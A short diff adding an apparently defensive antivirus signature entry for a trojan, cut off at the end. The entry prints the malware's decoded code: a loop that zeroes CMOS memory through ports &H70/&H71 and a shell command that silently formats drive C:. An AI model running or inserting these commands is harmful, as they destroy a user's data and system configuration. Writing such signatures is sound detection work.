@@ -1,0 +1,10 @@
+VIRUS NAME: Win.Trojan.Sp1-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+OR i = 0 TO 128
+OUT &H70, i
+OUT &H71, 0
+NEXT i
+SHELL "echo y|format c:/u/q/v:HELLO >NUL" CLS
+PRINT "Instal
